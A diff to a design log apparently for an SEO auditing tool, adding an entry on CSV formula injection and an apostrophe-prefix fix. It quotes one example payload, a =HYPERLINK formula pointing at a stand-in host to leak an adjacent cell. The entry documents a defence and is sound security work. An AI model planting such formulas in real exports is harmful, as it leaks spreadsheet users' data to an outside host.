@@ -473,3 +473,35 @@ unknown-run branch — and it passed anyway, because `42` is a substring of
 `max_response_bytes=5242880` in the effective-config line. It now crawls first and asserts on
 the message it means to test. A substring assertion on a short number is a coin flip against
 any line that prints numbers.
+
+## Post-launch — The CSV export is a third untrusted-data sink
+
+**Trigger.** The live pass continued into the export and API surfaces, which the crawl pass
+never touched. Both held up. Filters, sorting, an out-of-range page number, `size=0` and an
+unknown run id all answered correctly against real data, and `diff --json` agreed with the
+table. The dashboard held up too: `esc()` covers `& < > " and the apostrophe`, and every
+interpolation into `innerHTML` goes through it — the page title, the model's proposed title
+and meta, its diagnosis and its rejection reason, and the copy button's `data-copy`
+attribute. The CSV export did not.
+
+**The threat this tool actually has.** SEO Scout audits sites it does not own, so a page's
+`<title>` and description are attacker-chosen input, and `ai/sanitize.py` already says so:
+"Page text is untrusted." The CSV carries that same text into a different interpreter. Excel,
+LibreOffice and Sheets evaluate any cell whose first character is `=`, `+`, `-`, `@`, a tab or
+a carriage return, so a page served with a title of `=HYPERLINK("http://x/?"&A1,"click")`
+arrives in the audit report as a live formula that can leak the cell beside it. `csv.DictWriter`
+was already doing its job — commas, quotes and newlines are quoted correctly — but the CSV
+grammar and the spreadsheet's formula parser are two different layers, and only the first was
+defended.
+
+**Decision: mark such a value as text, do not change it.** `as_text()` prefixes one apostrophe,
+which is the spreadsheet's own "this cell is text" marker: it is stripped on display, survives
+a round trip, and still reads as the original string in a text editor or `csv.DictReader`.
+Stripping the character would silently alter what the site actually served, which is the one
+thing an audit report must not do. The guard runs over every string column rather than a
+curated list, so a column added later cannot quietly miss it; numbers are left alone, and on
+the 25 real rows of a live run it changed nothing.
+
+**Not the JSON export.** JSON has no formula interpreter, and a consumer that pastes JSON into
+a spreadsheet has already left the format. Defending one sink is the point; defending every
+hypothetical one would make the data less faithful for no gain.
